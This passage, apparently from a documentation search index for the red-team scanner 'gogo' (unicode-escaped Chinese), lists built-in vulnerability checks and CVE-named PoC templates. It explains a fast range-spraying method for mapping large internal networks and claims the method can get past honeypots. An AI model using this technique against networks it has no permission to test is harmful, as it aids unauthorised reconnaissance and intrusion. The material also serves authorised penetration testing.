\u901a\u8fc7finger\u914d\u7f6e\u7684tcp\u534f\u8bae\u6f0f\u6d1e \u901a\u8fc7\u63d2\u4ef6\u914d\u7f6e\u7684\u6f0f\u6d1e k8s_api_unauth \u666e\u5143EOS_console_leak redis_unauthorized smbghost elasticsearch_unauth weblogic_console_leak zookeeper_unauthorized ms17-010 hadoop_unauth sourcemap-leak memcahce_unauthorized oxid-leak docker_unauth swagger leak dubbo_unauthorized netbois-leak etcd_unauth druid leak socks5_unauthorized wmi-leak flink_unauth iis Directory traversal socks4_unauthorized snmp-public apache Directory traversal smb-leak bigip_console_leak solr_admin_leak \u901a\u8fc7nuclei\u914d\u7f6e\u7684\u6f0f\u6d1e <pre><code>\u251c\u2500bigip\n\u2502      f5-cve-2022-1388.yml\n\u251c\u2500cloud\n\u2502      couchdb_CVE-2017-12635.yaml\n\u2502      harbor-public-images.yaml\n\u2502      nacos-unauth.yml\n\u2502      yapi-register.yaml\n\u251c\u2500component\n\u2502      ueditor_file_upload.yml\n\u251c\u2500device\n\u2502      hikvision-cve-2021-36260.yml\n\u2502      ruijie_rce.yml\n\u251c\u2500gitlab\n\u2502      gitlab-cve-2021-22205.yml\n\u2502      gitlab-login.yml\n\u2502      gitlab-public-register.yml\n\u2502      gitlab-public-repos.yml\n\u2502      gitlab-user-enum.yml\n\u251c\u2500grafana\n\u2502      grafana-cve-2022-26148.yml\n\u2502      grafana-login.yml\n\u251c\u2500http\n\u2502      shiro-default-key.yml\n\u2502      shiro-detect.yml\n\u251c\u2500iis\n\u2502      iis_put.yaml\n\u251c\u2500login\n\u2502      activemq-login.yml\n\u2502      apisix-login.yaml\n\u2502      apollo-login.yml\n\u2502      canal-login.yaml\n\u2502      druid-login.yaml\n\u2502      dubbo-login.yaml\n\u2502      h3c-router-msr-login.yml\n\u2502      hikvision-camera-login.yml\n\u2502      huawei-ibmc-login.yml\n\u2502      jenkins_login.yml\n\u2502      minio-default-login.yaml\n\u2502      nacos-login.yml\n\u2502      nexus-default-login.yaml\n\u2502      rabbitmq-login.yml\n\u2502      ruijie_ap_login.yml\n\u2502      xxljob-default-login.yaml\n\u251c\u2500spring\n\u2502      spring-CVE-2016-4977.yml\n\u2502      spring-CVE-2018-1271.yml\n\u2502      spring-CVE-2018-1273.yml\n\u2502      springboot-actuator-h2-rce.yml\n\u2502      springboot-actuator-jolokia-rce.yml\n\u2502      springboot-actuator-logview-rce.yml\n\u2502      springboot-actuator.yml\n\u2502      springcloud-actuator-gateway-rce.yml\n\u2502      springcloud-lfi.yml\n\u251c\u2500tomcat\n\u2502      tomcat_login.yml\n\u2502      tomcat_manager_leak.yml\n\u251c\u2500vmware\n\u2502      vcenter-CVE-2021-21972.yml\n\u2502      vcenter-CVE-2021-21985.yml\n\u2502      vcenter-CVE-2021-22005.yml\n\u2502      vcenter_version.yml\n\u2502      vmware-CVE-2022-22954.yml\n\u251c\u2500weblogic\n\u2502      weblogic-CVE-2020-14883.yml\n\u2502      weblogic-CVE-2022-21371.yml\n\u2502      weblogic-xmldecode-rce.yml\n\u2502      weblogic_console_leak.yml\n\u2502      weblogic_iiop_detect.yml\n\u2502      weblogic_login.yml\n\u2502      weblogic_t3_detect.yml\n\u2502\n\u2514\u2500zabbix\n        zabbix-cve-2022-23231.yml\n        zabbix-login.yml\n</code></pre>"},{"location":"gogo/concept/#\u542f\u53d1\u5f0f\u626b\u63cf\u539f\u7406","title":"\u542f\u53d1\u5f0f\u626b\u63cf\u539f\u7406","text":"<p>\u542f\u53d1\u5f0f\u626b\u63cf\u8ba9\u626b\u63cfA\u6bb5\u6210\u4e3a\u53ef\u80fd\uff01</p> <p>\u80cc\u666f</p> <p>\u8fd9\u51e0\u5e74\u9047\u5230\u975e\u5e38\u591a\u7684\u9879\u76ee\u90fd\u9700\u8981\u5728\u51e0\u5929\u751a\u81f3\u51e0\u4e2a\u5c0f\u65f6\u5185\u5b8c\u6210\u5185\u7f51\u5237\u5206\u7684\u4efb\u52a1.\u5728\u6ca1\u6709\u4e4b\u524d\u62a5\u544a\u6216\u8005\u5185\u9b3c\u62a5\u4fe1\u7684\u60c5\u51b5\u4e0b, \u5185\u7f51\u8d44\u4ea7\u6d4b\u7ed8\u53ea\u80fd\u4f7f\u7528\u4f20\u7edf\u7684\u626b\u63cf\u5668\u4e00\u70b9\u4e00\u70b9\u63a2\u6d4b, \u5176\u6027\u80fd\u4e0e\u6548\u7387\u90fd\u975e\u5e38\u4f4e\u4e0b.fscan\u3001kscan\u4e4b\u7c7b\u7684\u5de5\u5177\u7565\u5fae\u6539\u5584\u4e86\u6761\u4ef6, \u5c06\u5185\u7f51\u7684\u63a2\u6d4b\u4ece\u51e0\u4e2ac\u6bb5\u63d0\u9ad8\u4e86\u6574\u4e2ab\u6bb5, \u5229\u7528go\u7684goroutine\u8f7b\u677e\u8fbe\u5230\u4e86\u6570\u5343\u7684\u5e76\u53d1, \u5b8c\u6210\u4e86\u4e4b\u524d\u96be\u4ee5\u5b9e\u73b0\u7684\u5e76\u53d1\u901f\u5ea6.\u4f46\u662f\u5728\u9762\u5bf9\u4e00\u4e2aa\u6bb5\u751a\u81f3\u67d0\u4e9b\u5927\u578b\u5185\u7f51\u7684\u6570\u5341\u4e2aa\u6bb5\u8fd8\u662f\u65e0\u80fd\u4e3a\u529b.</p> <p>\u9762\u5bf9\u8fd9\u79cd\u60c5\u51b5, \u57282020\u5e74\u4e0e\u51e0\u4e2a\u5927\u54e5\u4eec\u5546\u8ba8\u51fa\u4e86\u4e00\u4e2a\u89e3\u51b3\u65b9\u6848, \u5e76\u5728\u63a5\u8fd1\u4e00\u5e74\u7684\u5b9e\u6218\u4e2d\u68c0\u9a8c\u4e86\u8fd9\u4e2a\u65b9\u6848\u7684\u53ef\u884c\u6027.</p> <p>\u6839\u636e\u7ecf\u9a8c\u6211\u4eec\u4f1a\u53d1\u73b0, \u5165\u53e3\u70b9\u7684C\u6bb5\u4ee5\u53ca\u5468\u8fb9\u7684\u51e0\u4e2aC\u6bb5\u901a\u5e38\u4f1a\u5b58\u5728\u5927\u91cf\u8d44\u4ea7.</p> <p>\u56e0\u6b64, \u53ef\u4ee5\u505a\u51fa\u731c\u60f3\uff1a\u5982\u679c\u67d0\u4e2aC\u6bb5\u5b58\u5728\u4efb\u610f\u4e00\u4e2a\u8d44\u4ea7, \u90a3\u4e48\u8fd9\u4e2aC\u6bb5\u5c31\u53ef\u80fd\u5b58\u5728\u66f4\u591a\u8d44\u4ea7.</p> <p>\u542f\u53d1\u5f0f\u626b\u63cf\u7684\u8bbe\u8ba1\u5c06\u6839\u636e\u8fd9\u4e2a\u731c\u60f3\u8fdb\u884c, \u5bf9\u4e8e\u4e00\u4e9b\u5b9e\u73b0\u7684\u5177\u4f53\u7ec6\u8282\u53ca\u5404\u79cd\u5404\u6837\u7684\u4f18\u5316, \u5177\u4f53\u7684\u4e0b\u9762\u4f1a\u63d0\u5230.</p>"},{"location":"gogo/concept/#b\u6bb5\u7684\u542f\u53d1\u5f0f\u626b\u63cf","title":"B\u6bb5\u7684\u542f\u53d1\u5f0f\u626b\u63cf","text":"<p>\u5bf9\u4e8eB\u6bb5\u6765\u8bf4, \u4e00\u5171\u670965535\u4e2aIP, 256\u4e2aC\u6bb5.</p> <p>\u4ece\u6240\u6709C\u6bb5\u627e\u5230\u5b58\u6d3b\u7684C\u6bb5, \u53ef\u4ee5\u91c7\u7528TCP\\udp\\icmp\u534f\u8bae\u8fdb\u884c\u8bf7\u6c42.\u5982\u679c\u67d0\u4e2aC\u6bb5\u4e2d\u5b58\u5728\u4efb\u610f\u4e00\u4e2a\u56de\u5e94, \u90a3\u5c31\u5c06\u8fd9\u4e2aC\u6bb5\u6807\u8bb0\u4e3a\u5b58\u6d3b, \u4e4b\u540e\u5c31\u4e0d\u518d\u626b\u63cf\u8fd9\u4e2aC\u6bb5\u4e86.</p> <p>\u6839\u636e\u4ee5\u4e0a\u601d\u8def, \u5982\u679c\u6211\u4eec\u4ee580\u7aef\u53e3\u4f5c\u4e3a\u6807\u5fd7\u53ea\u9700\u8981\u626b\u63cf65535\u6b21.\u5bf9\u4e8ego\u6765\u8bf4, 1000\u4e2a\u5e76\u53d1\u662f\u5f88\u8f7b\u677e\u7684\u4e8b\u60c5, \u6d88\u8017\u4e0d\u4e86\u591a\u5c11\u8d44\u6e90(\u5927\u6982\u662f\u4e00\u68382G\u670d\u52a1\u5668 50MB\u5185\u5b58,10%CPU), \u5728\u8001\u7684Linux\u53d1\u884c\u7248\u4e0a\u5c31\u7b97\u6709fd\u9650\u5236\u4e5f\u662f1024, \u5982\u679c\u662f\u65b0\u53d1\u884c\u7248, \u5219\u8dd1\u4e2a10000\u5e76\u53d1\u4e5f\u5f88\u8f7b\u677e.</p> <p>\u8ba1\u7b97\u4e00\u4e0b\u65f6\u95f4, \u4ee52\u79d2\u4e3a\u9ed8\u8ba4\u8d85\u65f6(\u5b9e\u6218\u4e2d\u6d4b\u8bd5\u51fa\u6765\u80fd\u5c3d\u53ef\u80fd\u7684\u53d1\u73b0\u76ee\u6807, \u4f46\u4e0d\u5f71\u54cd\u7ed3\u679c\u7684\u6700\u77ed\u8d85\u65f6\u65f6\u95f4, icmp\u4e3a1\u79d2), 1000\u5e76\u53d1. 65535*2/1000 = 130\u79d2.\u975e\u5e38\u5feb, \u63a2\u6d4b\u4e00\u6574\u4e2ab\u6bb5\u7684\u5b58\u6d3bC\u6bb5\u53ea\u9700\u89812\u5206\u949f.\u5982\u679c\u662f\u5728linux\u4e0a, \u6211\u5e38\u75284000\u7684\u5e76\u53d1, \u5927\u6982\u53ea\u9700\u898130\u79d2.</p> <p>\u5728\u55b7\u6d12\u51fa\u5b58\u6d3b\u7684C\u6bb5\u540e, \u518d\u5bf9\u5b58\u6d3b\u7684C\u6bb5\u8fdb\u884c\u5177\u4f53\u7684\u7aef\u53e3\u63a2\u6d4b, \u53ef\u4ee5\u4f7f\u7528<code>-p</code>\u53c2\u6570\u6307\u5b9a\u4efb\u610f\u7684\u7aef\u53e3\u53f7.\u8fd9\u6837, \u626b\u63cf\u8017\u65f6\u5c31\u53d8\u6210\u4e86130\u79d2 + \u5b58\u6d3b\u7684C\u6bb5\u6570*(256*\u6307\u5b9a\u7684\u7aef\u53e3\u6570\u00d72)/1000.\u5982\u679c\u5b58\u6d3b10\u4e2aC\u6bb5, \u6307\u5b9a\u4e86100\u4e2a\u7aef\u53e3, \u6d4b\u7ed8\u6574\u4e2aB\u6bb5\u7684\u8017\u65f6 130+10\u00d7(256\u00d7100\u00d72)/1000 = 642\u79d2, \u5927\u6982\u5341\u5206\u949f.</p> <p>\u5f53\u7136, \u8fd9\u8fd8\u53ef\u4ee5\u4f18\u5316, \u4f8b\u5982</p> <ol> <li>\u901a\u8fc7\u7b97\u6cd5\u4ee5C\u6bb5\u4f18\u5148\u751f\u6210\u4f8b\u5982 1.1.1.1, 1.1.2.1, 1.1.3.1\u8fd9\u6837\u4efb\u52a1\u987a\u5e8f, \u6309\u7167\u5b89\u5168\u5708\u7684\u547d\u540d\u4e60\u60ef, \u5e94\u8be5\u53eb\u505aC\u6bb5\u55b7\u6d12(C class Spray)</li> <li>\u5982\u679c\u67d0\u4e2aC\u6bb5\u6807\u8bb0\u4e3a\u5b58\u6d3b, \u8fd9\u4e0d\u8fdb\u884c\u540e\u7eed\u53d1\u5305, \u4e5f\u5c31\u662f\u8bf4\u5b58\u6d3b\u7684C\u6bb5\u8d8a\u591a\u8017\u65f6\u8d8a\u77ed</li> <li>\u8f93\u51fa\u7ed3\u679c\u4f1a\u4fdd\u7559\u63a2\u6d4b\u5b58\u6d3b\u7684IP/24\u7684\u5f62\u5f0f(\u800c\u4e0d\u662f1.1.1.0/24), \u65b9\u4fbf\u4e8c\u6b21\u9a8c\u8bc1</li> <li>\u53ef\u914d\u7f6e\u7684\u63a2\u6d4b\u6307\u6807, gogo\u4e2d\u6709\u4e2a\u53c2\u6570smart-probe, \u5373<code>-sp 80,icmp,445</code>(\u9ed8\u8ba480)  ,\u5c06\u540c\u65f6\u4f7f\u7528\u4e09\u4e2a\u6807\u5fd7\u9a8c\u8bc1, \u5f53\u7136\u8017\u65f6\u4e5f\u4f1a\u4e583(\u4f1a\u4fdd\u7559123\u4e2d\u63d0\u5230\u7684\u4f18\u5316)</li> <li>\u6dfb\u52a0<code>-no</code>\u53c2\u6570, \u53ea\u8fdb\u884cC\u6bb5\u55b7\u6d12, \u4e0d\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u5b58\u6d3bC\u6bb5\u7aef\u53e3\u626b\u63cf</li> </ol>"},{"location":"gogo/concept/#a\u6bb5\u7684\u542f\u53d1\u5f0f\u626b\u63cf","title":"A\u6bb5\u7684\u542f\u53d1\u5f0f\u626b\u63cf","text":"<p>A\u6bb5\u4e2d\u4e00\u5171\u6709256\u4e2aB\u6bb5, 65535\u4e2aC\u6bb5</p> <p>\u8fd9\u91cc\u4f1a\u53d1\u73b0\u4e00\u4e2a\u95ee\u9898, \u5982\u679c\u6307\u5b9a\u7684\u662fA\u6bb5, \u90a3\u8fd9\u79cd\u55b7\u6d12\u65b9\u5f0f\u7684\u8017\u65f6\u5c31\u4f1a\u53d8\u621065535\u00d7256, \u5927\u6982\u662f\u4e00\u5343\u516d\u767e\u591a\u4e07\u4e2aIP, \u8017\u65f6\u5927\u7ea6\u662f16776960\u00d72/1000=33553\u79d2=9\u4e2a\u5c0f\u65f6</p> <p>\u5149\u8fdb\u884cC\u6bb5\u55b7\u6d12, \u5c31\u9700\u89819\u4e2a\u5c0f\u65f6, \u90a3\u8d44\u4ea7\u6d4b\u7ed8\u5c31\u66f4\u65e0\u4ece\u8c08\u8d77\u4e86.</p> <p>\u8fd8\u597d, \u8fd9\u4e5f\u662f\u6709\u89e3\u51b3\u529e\u6cd5\u7684.</p> <p>\u521a\u624d\u63d0\u5230\u4e86\u4ee5\u55b7\u6d12C\u6bb5\u5b9e\u73b0\u7684B\u6bb5\u542f\u53d1\u5f0f\u626b\u63cf, \u628a\u8fd9\u4e2a\u601d\u8def\u6269\u5927\u4e00\u7ea7, \u53ef\u4ee5\u5bf9A\u6bb5\u4f7f\u7528.\u53ef\u4ee5\u5c06C\u6bb5\u4f5c\u4e3a\u5b58\u6d3b\u5355\u4f4d, IP\u4f5c\u4e3a\u5b58\u6d3b\u6807\u5fd7\u4f4d\u8fdb\u884cB\u6bb5\u55b7\u6d12,  \u5bf9\u6bcf\u4e2aC\u6bb5\u7684\u7b2c\u4e00\u4e2aIP\u8fdb\u884c<code>-sp</code>\u6307\u5b9a\u7684\u7aef\u53e3\u63a2\u6d4b.</p> <p>\u8fd9\u6837, \u5bf9A\u6bb5\u8fdb\u884cB\u6bb5\u55b7\u6d12\u7684\u8017\u65f6\u5c31\u53ef\u4ee5\u8ba1\u7b97\u5230, \u540c\u6837\u662f(65535\u00d72/1000)=130\u79d2</p> <p>\u5728\u63a2\u6d4b\u5230\u5b58\u6d3bB\u6bb5\u7684\u60c5\u51b5\u4e0b, \u518d\u5355\u72ec\u8fdb\u884cB\u6bb5\u7684\u542f\u53d1\u626b\u63cf, \u5927\u6982\u662f\u68af\u5ea6\u4e0b\u964d\u7684\u601d\u8def.\u5bf9A\u6bb5\u8fdb\u884c\u8fd9\u79cd\u65b9\u5f0f\u7684C\u6bb5\u55b7\u6d12\u8017\u65f6\u5219\u662f (65535\u00d72/1000)\u00d7n(\u5b58\u6d3b\u7684B\u6bb5)\u00d7130\u79d2.\u6700\u574f\u60c5\u51b5\u4e0b\u9700\u89819\u4e2a\u5c0f\u65f6, \u6b63\u5e38\u60c5\u51b51\u4e2a\u5c0f\u65f6\u5373\u53ef\u5b8c\u6210\u5bf9A\u6bb5\u7684C\u6bb5\u5b58\u6d3b\u6d4b\u7ed8.</p> <p>\u53ef\u4ee5\u4f18\u5316\uff1aB\u6bb5\u7684\u542f\u53d1\u5f0f\u626b\u63cf\u4f18\u5316\u540c\u6837\u9002\u7528\u4e0e\u8fd9\u91cc, \u8fd8\u6dfb\u52a0\u4e86\u4e00\u4e9b\u9488\u5bf9\u6027\u7684\u4f18\u5316\uff1a</p> <ol> <li>\u6dfb\u52a0<code>ip-probe</code>\u53c2\u6570, <code>-ipp 1,254</code>(\u9ed8\u8ba41), \u6307\u5b9aC\u6bb5\u4e2d\u7684\u6807\u5fd7IP.</li> <li>\u6dfb\u52a0<code>-no</code>\u53c2\u6570, \u53ea\u8fdb\u884cB\u6bb5\u55b7\u6d12, \u4e0d\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684C\u6bb5\u55b7\u6d12\u4e0e\u7aef\u53e3\u626b\u63cf.</li> <li>\u5728\u8fdb\u884cB\u6bb5\u55b7\u6d12\u7684\u65f6\u5019, \u9ed8\u8ba4\u7aef\u53e3\u4e3aicmp, \u4f7f\u7528<code>-sp</code>\u6307\u5b9a\u4efb\u610f\u7aef\u53e3\u6216\u534f\u8bae.</li> <li>\u5728<code>-p</code>\u53ea\u6307\u5b9a\u4e861~2\u4e2a\u7aef\u53e3\u7684\u65f6\u5019, \u4e0d\u8fdb\u884cC\u6bb5\u55b7\u6d12, \u76f4\u63a5\u8fdb\u884c\u7aef\u53e3\u626b\u63cf( C\u6bb5\u55b7\u6d12\u7ea6\u7b49\u4e8e\u8fdb\u884c\u4e00\u6b21\u5355\u7aef\u53e3\u5168\u626b\u63cf).</li> </ol> <p>\u7f3a\u70b9</p> <ol> <li>\u8fd9\u6837\u5927\u89c4\u6a21\u7684\u8de8\u7f51\u6bb5\u626b\u63cf, \u662f\u5f88\u96be\u9003\u8fc7\u6d41\u91cf\u8bbe\u5907\u4e0e\u871c\u7f50\u7684\u68c0\u6d4b\u7684, \u6240\u4ee5\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u626b\u63cf\u7684\u65f6\u5019\u9700\u8981\u8003\u8651\u5931\u53bb\u8fd9\u4e2a\u70b9\u7684\u540e\u679c.\u4e0d\u8fc7\u871c\u7f50\u5927\u591a\u4e0d\u4f1a\u90e8\u7f72\u5728\u7f51\u5173ip, \u56e0\u6b64\u542f\u53d1\u5f0f\u626b\u63cf\u4e0d\u5931\u4e3a\u4e00\u79cd\u7ed5\u8fc7\u871c\u7f50\u7684\u626b\u63cf\u65b9\u5f0f.</li> <li>\u4e3a\u4e86\u6548\u7387\u53ef\u80fd\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6f0f\u62a5, \u4f8b\u5982, \u67d0\u4e2a\u529e\u516c\u6bb5\u6ca1\u670980\u7aef\u53e3\u5f00\u542f, \u8fd9\u79cd\u60c5\u51b5\u4e0b\u53ef\u80fd\u4f1a\u6f0f\u62a5, \u4f46\u5b9e\u9645\u4e0a\u6781\u5c11\u53d1\u751f, \u9009\u62e9\u5408\u9002\u7684\u542f\u53d1\u5f0f\u626b\u63cf\u914d\u7f6e\u53ef\u4ee5\u89c4\u907f\u8fd9\u6837\u7684\u6f0f\u62a5.</li> </ol>"},{"location":"gogo/design/","title":"gogo \u00b7 \u8bbe\u8ba1","text":""},{"location":"gogo/design/#\u80cc\u666fbackground","title":"\u80cc\u666f/Background","text":"<p>\u9ed8\u8ba4\u9605\u8bfb\u8005\u5df2\u5bf9\u76f8\u5173\u9886\u57df\u6709\u4e00\u5b9a\u4e86\u89e3</p> <p>\u7aef\u53e3\u626b\u63cf\u5668\u5728\u4eca\u5929\u4e5f\u6709\u975e\u5e38\u591a\u7684\u5206\u652f\u4e86, \u9762\u5411\u4e0d\u540c\u7684\u7528\u6237\u4e0d\u540c\u7684\u573a\u666f\u4e0d\u540c\u7684\u73af\u5883.</p> <ul> <li>\u6709\u4e13\u6ce8\u4e8e\u7aef\u53e3\u5f00\u653e\u60c5\u51b5\u7684MX1014(TCP), masscan(SYN), \u65e0\u6cd5\u89e3\u51b3\u6f0f\u62a5\u95ee\u9898\u6216\u8005\u529f\u80fd\u592a\u8fc7\u5355\u4e00</li> <li>\u6709\u4f20\u7edf\u7684\u8001\u724c\u5168\u80fd\u626b\u63cf\u5668nmap, \u529f\u80fd\u5f3a\u5927\u4f46\u6700\u5f3a\u7684\u5730\u65b9\u4e0d\u662f\u7aef\u53e3\u63a2\u6d4b, \u800c\u662f\u4f20\u8f93\u5c42\u7684\u5404\u79cd\u624b\u6cd5</li> <li>\u6709\u81ea\u5b9a\u4e49\u4f20\u8f93\u5c42\u534f\u8bae\u7684\u626b\u63cf\u5668sx, naabu, \u7c7b\u4f3cgo\u7248\u672c\u7684nmap</li> <li>\u4ee5\u53ca\u8fd9\u4e24\u5e74\u5f88\u706b\u7684\u5404\u79cd\u7ea2\u961f\u5411\u626b\u63cf\u5668:fscan, kscan, yasso\u7b49\u7b49, \u529f\u80fd\u8f83\u591a, \u4f46\u7f3a\u4e4f\u6253\u78e8</li> <li>\u5185\u7f51\u7f51\u6bb5\u63a2\u6d4b\u626b\u63cf\u5668, netspy, \u529f\u80fd\u8f83\u4e3a\u5355\u4e00, \u9700\u8981\u591a\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u53cd\u800c\u9ebb\u70e6</li> </ul> <p>\u8fd8\u6709\u975e\u5e38\u591a\u7684\u9488\u5bf9\u5404\u79cd\u72ec\u7279\u9886\u57df\u7684\u626b\u63cf\u5668.</p> <p>\u800cgogo\u7684\u5b9a\u4f4d\u5219\u662f\u81ea\u52a8\u5316\u5f15\u64ce, \u5305\u542b\u7f51\u6bb5\u63a2\u6d4b, \u7aef\u53e3\u63a2\u6d4b, \u6307\u7eb9\u8bc6\u522b\u4e0epoc\u9a8c\u8bc1\u529f\u80fd.\u4f46\u629b\u5f03\u4e86\u5404\u79cd\u670d\u52a1\u5f31\u53e3\u4ee4\u7206\u7834\u7684\u529f\u80fd.</p> <p>\u7f51\u6bb5\u63a2\u6d4b, \u7aef\u53e3\u53d1\u73b0, \u6307\u7eb9\u8bc6\u522b\u4e0epoc\u9a8c\u8bc1\u5b9e\u9645\u4e0a\u662f\u4e00\u6761\u6d41\u6c34\u7ebf\u4e0a\u7684\u5de5\u4f5c, \u903b\u8f91\u4e0a\u524d\u540e\u8fde\u7eed\u4e00\u81f4, \u4e0d\u4f1a\u5e26\u6765\u591a\u5927\u7684\u6027\u80fd\u8d1f\u62c5.\u800c\u5404\u79cd\u670d\u52a1\u7684\u5f31\u53e3\u4ee4\u5219\u5f15\u5165\u4e86\u4e0d\u4e00\u81f4\u6027, \u9700\u8981\u65b0\u589e\u5f88\u591a\u914d\u7f6e\u53c2\u6570, \u5f15\u5165\u5f88\u591a\u5e93, \u5f15\u5165\u5404\u79cd\u5404\u6837\u7684\u4ee3\u7801.\u56e0\u6b64, \u5f31\u53e3\u4ee4\u7206\u7834\u8fd9\u4e00\u5757, \u5c06\u7531\u72ec\u7acb\u7684\u5de5\u5177\u5b9e\u73b0.</p> <p>\u5982\u679c\u60f3\u6df1\u5165\u4e86\u89e3gogo, \u9700\u8981\u7406\u89e3gogo\u9762\u4e34\u7684\u95ee\u9898, \u4ee5\u53cagogo\u7684\u8bbe\u8ba1\u7406\u5ff5\u4e0e\u89e3\u51b3\u65b9\u6848, \u4e5f\u5c31\u662f\u8bbe\u8ba1\u4e0e\u7ec6\u8282\u4e24\u7ae0.\u4e5f\u8bb8\u80fd\u7406\u89e3\u5230\u4e3a\u4f55gogo\u662f\u4e3a\u7ea2\u961f\u800c\u8bbe\u8ba1\u7684.\u8fd9\u4e2a\u4e16\u754c\u4e0d\u9700\u8981\u66f4\u591a\u7684\u7f1d\u5408\u602a, \u6211\u4eec\u5173\u6ce8\u7684\u91cd\u70b9\u5e94\u8be5\u662f\u5bf9\u7ec6\u8282\u6253\u78e8\u4e0e\u5bf9\u529f\u80fd\u7684\u518d\u521b\u65b0.</p> <p>\u672c\u6587\u5c06\u63cf\u8ff0gogo\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898, \u4ee5\u53ca\u89e3\u51b3\u7684\u65b9\u6848.</p> <p>\u53d6\u820d</p> <p>gogo\u7684\u8bbe\u8ba1\u4e4b\u521d\u662f\u4e3a\u4e86\u5185\u7f51\u573a\u666f, \u4e3a\u6b64\u505a\u51fa\u4e86\u5927\u91cf\u7684\u53d6\u820d\u4e0e\u59a5\u534f.\u867d\u7136\u73b0\u5728\u7684gogo\u5728\u5916\u7f51\u573a\u666f\u4e0b\u4e5f\u80fd\u8d77\u5230\u4e0d\u9519\u7684\u6548\u679c, \u4f46\u5e76\u975e\u6700\u4f18\u7684\u89e3\u51b3\u65b9\u6848.\u540e\u7eed\u5c06\u4f1a\u4f7f\u7528\u5176\u4ed6\u5de5\u5177/\u5de5\u5177\u94fe\u63d0\u4f9b\u5916\u7f51\u573a\u666f\u7684\u89e3\u51b3\u65b9\u6848.</p>"},{"location":"gogo/design/#\u67b6\u6784architecture","title":"\u67b6\u6784/Architecture","text":"<p>gogo\u7684\u6838\u5fc3\u80fd\u529b\u67b6\u6784:</p> <ul> <li>\u4efb\u52a1\u751f\u6210\u5668(Generator). \u901a\u8fc7\u591a\u4e2a\u547d\u4ee4\u884c\u53c2\u6570, \u53ef\u63a7\u5236gogo\u751f\u6210\u76ee\u6807\u961f\u5217\u7684\u7ec6\u8282. \u4ee5\u5b9e\u73b0\u66f4\u9ad8\u6548\u7387\u7684\u626b\u63cf\u6216\u89c4\u907f\u9632\u62a4\u8bbe\u5907\u3002</li> <li>\u4fe1\u606f\u6536\u96c6\u5668 (Collector).  \u5728\u5c3d\u53ef\u80fd\u5c11\u53d1\u5305\u7684\u60c5\u51b5\u4e0b, \u6536\u96c6\u5230\u66f4\u591a\u7684\u57fa\u672c\u4fe1\u606f, \u5e76\u5141\u8bb8\u4ece\u76ee\u6807\u4e2d\u63d0\u53d6\u9700\u8981\u7684\u6570\u636e.</li> <li>\u6307\u7eb9\u6a21\u5757 (Finger).  \u901a\u8fc7\u81ea\u5b9a\u4e49\u7684\u6307\u7eb9DSL\u5b9e\u73b0\u8986\u76d6\u7edd\u5927\u591a\u6570\u573a\u666f\u4e0e\u9700\u6c42\u7684\u6307\u7eb9\u8bc6\u522b\u56e0\u4e3a. </li> <li>\u7aef\u53e3\u63d2\u4ef6 (Plugin).  \u5141\u8bb8\u7f16\u5199go\u8bed\u8a00\u63d2\u4ef6\u62d3\u5c55gogo\u5bf9\u590d\u6742\u7aef\u53e3\u7684\u63a2\u6d4b\u80fd\u529b.</li> <li>\u8f7b\u91cf\u7ea7nuclei\u5f15\u64ce (Poc Engine). \u901a\u8fc7\u517c\u5bb9\u5927\u90e8\u5206nuclei poc\u7684\u89c4\u5219\u7ee7\u627f\u6700\u5f3a\u5927\u7684poc\u793e\u533a.</li> </ul>"},{"location":"gogo/design/#\u8bbe\u8ba1\u54f2\u5b66design-philosophy","title":"\u8bbe\u8ba1\u54f2\u5b66/Design Philosophy","text":"<p>gogo\u7684\u5b9a\u4f4d\u59cb\u7ec8\u662f\u81ea\u52a8\u5316\u5f15\u64ce\uff0c\u800c\u4e0d\u662f\u5168\u80fd\u626b\u63cf\u5668\u3002\u6f0f\u6d1e\u626b\u63cf\u529f\u80fd\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u81ea\u52a8\u5316\uff0c\u800c\u975e\u4e3b\u8981\u529f\u80fd\u3002</p> <p>\u4f5c\u4e3a\u81ea\u52a8\u5316\u5f15\u64ce\uff0cgogo\u5e2e\u52a9\u4eba\u4eec\u81ea\u52a8\u5b8c\u621099%\u7684\u590d\u6742\u5de5\u4f5c\uff0c\u4f7f\u4eba\u4eec\u80fd\u591f\u5c06\u6ce8\u610f\u529b\u96c6\u4e2d\u5728\u66f4\u6709\u4ef7\u503c\u7684\u4e8b\u60c5\u4e0a\u3002</p> <p>\u5728\u4f7f\u7528gogo\u65f6\uff0c\u4f60\u53ef\u80fd\u4f1a\u4f53\u9a8c\u5230\u5176\u72ec\u7279\u7684\u8bbe\u8ba1\u3002</p>"},{"location":"gogo/design/#\u8bbe\u8ba1\u76ee\u6807","title":"\u8bbe\u8ba1\u76ee\u6807","text":"<ul> <li>\u5feb\uff1a\u5c3d\u53ef\u80fd\u4fdd\u8bc1\u6700\u5927\u517c\u5bb9\u6027\u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5feb\u901f\u5ea6\u5b8c\u6210\u4efb\u52a1\u3002</li> <li>\u53ef\u63a7\uff1a\u5de5\u5177\u5e94\u8be5\u4f5c\u4e3a\u624b\u4e0e\u8111\u7684\u884d\u751f\uff0c\u63d0\u4f9b\u4e30\u5bcc\u7684\u53c2\u6570\u548c\u63a7\u5236\u9009\u9879\u3002</li> <li>\u53ef\u62d3\u5c55\uff1a\u9700\u8981\u53ef\u62d3\u5c55\u7684\u540c\u65f6\u53c8\u8981\u907f\u514d\u91cd\u590d\u9020\u8f6e\u5b50, gogo\u5e76\u4e0d\u6253\u7b97\u628a\u4e16\u754c\u4e0a\u7684\u6240\u6709poc\u91cd\u65b0\u5b9e\u73b0\u4e00\u904d\u3002</li> <li>\u53ef\u5904\u7406\uff1a\u6570\u636e\u5206\u6790\u5e94\u8be5\u7ecf\u53ef\u80fd\u7684\u4ea4\u7ed9\u8ba1\u7b97\u673a\u53bb\u505a, \u4eba\u7c7b\u5e76\u4e0d\u9002\u5408\u505a\u590d\u6742\u6570\u636e\u7684\u5206\u6790\u3002</li> </ul> <p>\u91cd\u8981</p> <p>\u7c7b\u4f3c\u5de5\u5177\u7684\u5f00\u53d1\u9700\u8981\u6295\u5165\u5927\u91cf\u65f6\u95f4\u548c\u7ecf\u9a8c\u6765\u6253\u78e8\u7ec6\u8282\u3002</p> 